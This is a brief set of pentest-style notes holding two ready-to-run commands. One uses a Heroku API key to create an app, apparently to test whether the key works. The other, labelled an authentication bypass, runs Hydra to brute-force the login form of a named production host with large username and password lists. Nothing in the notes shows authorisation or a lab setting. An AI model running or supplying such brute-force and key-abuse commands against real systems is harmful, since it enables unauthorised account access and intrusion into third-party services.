

Heroku API check 
`curl -X POST https://api.heroku.com/apps -H "Accept: application/vnd.heroku+json; version=3" -H "Authorization: Bearer $HEROKU_API_KEY"`

hydra usage/ Authentication bypass
`sudo hydra -L 10k-usernames.txt -P password-biglist.txt -u -f  minimap-fusion.prod.lt.tomtom-global.com  https-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials" -V -t 64`